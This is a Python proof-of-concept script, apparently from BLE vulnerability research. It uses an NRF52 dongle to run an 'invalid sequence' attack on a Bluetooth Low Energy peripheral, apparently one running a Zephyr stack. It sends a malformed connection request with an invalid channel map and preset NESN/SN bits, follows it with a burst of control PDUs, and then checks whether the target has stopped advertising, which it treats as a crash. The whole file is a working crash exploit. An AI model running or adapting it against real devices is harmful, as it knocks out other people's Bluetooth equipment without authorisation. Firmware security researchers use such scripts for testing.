#!/usr/bin/python
import os
import platform
import sys
from time import sleep

# libs
sys.path.insert(0, os.getcwd() + '/libs')
import colorama
from colorama import Fore
from drivers.NRF52_dongle import NRF52Dongle
from scapy.layers.bluetooth4LE import *
from scapy.layers.bluetooth import ATT_Hdr, ATT_Exchange_MTU_Request
from timeout_lib import start_timeout, update_timeout

# Default master address
master_address = '5d:36:ac:90:0b:22'
access_address = 0x9a328370
connecting = False
slave_txaddr = 0
none_count = 0
slave_connected = False
send_version_ind = False
end_connection = False
payload_sent = False
run_script = True
SCAN_TIMEOUT = 0.5
CRASH_TIMEOUT = 6.0

# Autoreset colors
colorama.init(autoreset=True)

# Get serial port from command line
if len(sys.argv) >= 2:
    serial_port = sys.argv[1]
elif platform.system() == 'Linux':
    serial_port = '/dev/ttyACM0'
elif platform.system() == 'Windows':
    serial_port = 'COM1'
else:
    print(Fore.RED + 'Platform not identified')
    sys.exit(0)

print(Fore.YELLOW + 'Serial port: ' + serial_port)

# Get advertiser_address from command line (peripheral addr)
if len(sys.argv) >= 3:
    advertiser_address = sys.argv[2].lower()
else:
    advertiser_address = 'f8:f0:05:f3:66:e0'.upper()

print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.upper())


def crash_timeout():
    global connecting, run_script
    connecting = False
    print(Fore.RED + "No advertisement from " + advertiser_address.upper() +
          ' received\nThe device may have crashed!!!')
    run_script = False


def scan_timeout():
    global timeout_scan, connecting
    connecting = False
    if not slave_connected:
        scan_req = BTLE() / BTLE_ADV(RxAdd=slave_txaddr) / BTLE_SCAN_REQ(
            ScanA=master_address,
            AdvA=advertiser_address)

        driver.send(scan_req, force_pcap_save=True)

    start_timeout('scan_timeout', SCAN_TIMEOUT, scan_timeout)


# Open serial port of NRF52 Dongle
driver = NRF52Dongle(serial_port, '115200', logs_pcap=True,
                     pcap_filename='logs/zephyr_invalid_sequence.pcap')
driver.set_log_tx(1)
# Send scan request
scan_req = BTLE() / BTLE_ADV(RxAdd=0) / BTLE_SCAN_REQ(
    ScanA=master_address,
    AdvA=advertiser_address)
driver.send(scan_req, force_pcap_save=True)

# Start the scan timeout to resend packets
start_timeout('scan_timeout', SCAN_TIMEOUT, scan_timeout)

print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
while run_script:
    pkt = None
    # Receive packet from the NRF52 Dongle
    data = driver.raw_receive()
    if data:
        # Decode Bluetooth Low Energy Data
        pkt = BTLE(data)
        # if packet is incorrectly decoded, you may not be using the dongle
        if pkt is None:
            none_count += 1
            if none_count >= 4:
                print(Fore.RED + 'NRF52 Dongle not detected')
                sys.exit(0)
            continue
        # --------------- Process Link Layer Packets here ------------------------------------
        # Check if packet from advertised is received
        if pkt and (BTLE_SCAN_RSP in pkt or BTLE_ADV_IND in pkt) and pkt.AdvA == advertiser_address.lower() \
                and not connecting:
            update_timeout('crash_timeout')
            update_timeout('scan_timeout')
            print(Fore.GREEN + advertiser_address.upper() + ': ' + pkt.summary()[7:] + ' Detected')
            connecting = True
            payload_sent = False
            slave_txaddr = pkt.TxAdd
            conn_request = BTLE() / BTLE_ADV(RxAdd=slave_txaddr, TxAdd=0) / BTLE_CONNECT_REQ(
                InitA=master_address,
                AdvA=advertiser_address,
                AA=access_address,  # Access address (any)
                crc_init=0x179a9c,  # CRC init (any)
                win_size=2,  # 2.5 of windows size (anchor connection window size)
                win_offset=1,  # 1.25ms windows offset (anchor connection point)
                interval=16,  # 20ms connection interval
                latency=0,  # Slave latency (any)
                timeout=25,  # Supervision timeout, 250ms (any)
                chM=0x1FFFFFFFFF,  # Invalid channel map
                hop=5,  # Hop increment (any)
                SCA=0,  # Clock tolerance
            )

            # driver.set_nesnsn(0b00)  # Change to 0 so you can see the stability difference
            driver.set_nesnsn(0b11)  # Set the initial value of both NESN and SN to 1
            # You can also set them individually as bellow
            # driver.set_nesn(1)
            # driver.set_sn(1)
            # Yes, we're sending raw link layer messages in Python. Don't tell anyone as this is forbidden!!!
            driver.send(conn_request, force_pcap_save=True)  # Send connection request to advertiser
            print(Fore.YELLOW + 'Invalid sequence attack started, initial ACK bits set to 1')

            # Start the timeout to detect crashes
            start_timeout('crash_timeout', CRASH_TIMEOUT, crash_timeout)

        elif BTLE_DATA in pkt:
            update_timeout('crash_timeout')
            if BTLE_EMPTY_PDU not in pkt:
                print(Fore.YELLOW + "Slave RX <--- " + pkt.summary()[7:] + Fore.RESET)

            if not payload_sent:
                payload_sent = True
                # The attack attempts to send multiple packets while initiating the anchor point with nesn and sn set to 1
                # 1) Send Feature request
                pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_FEATURE_RSP(
                    feature_set='le_encryption+le_data_len_ext')
                driver.send(pkt)
                # 2) Send version ind request
                pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
                driver.send(pkt)
                # 3) Send length request
                pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ(
                    max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
                driver.send(pkt)
                # 4) Send ATT MTU Request
                pkt = BTLE(access_addr=access_address) / \
                      BTLE_DATA() / L2CAP_Hdr() / ATT_Hdr() / ATT_Exchange_MTU_Request(mtu=247)
                driver.send(pkt)

                # The driver will automatically retransmit packets if the peripheral fails to send the correct ack
                # Generally, the peripheral will not respond to repeated retransmissions of step 1)

    sleep(0.01)

driver.save_pcap()
print(Fore.GREEN + "Capture saved in logs/zephyr_invalid_sequence.pcap")
